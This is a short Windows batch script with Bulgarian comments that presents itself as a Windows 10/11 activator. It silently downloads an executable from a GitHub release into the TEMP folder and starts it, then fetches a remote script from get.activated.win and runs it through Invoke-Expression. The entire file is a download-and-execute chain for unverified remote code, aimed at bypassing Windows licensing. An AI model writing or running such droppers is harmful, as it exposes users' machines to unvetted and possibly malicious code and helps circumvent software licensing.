@echo off

:: Изтегляне на файл с алтернативен метод
powershell -Command ^
    "$ProgressPreference = 'SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"

:: Изчакване
timeout /t 5 /nobreak >nul

:: Изпълнение на втория URL
powershell -Command ^
    "$ProgressPreference = 'SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-RestMethod 'https://get.activated.win' | Invoke-Expression"
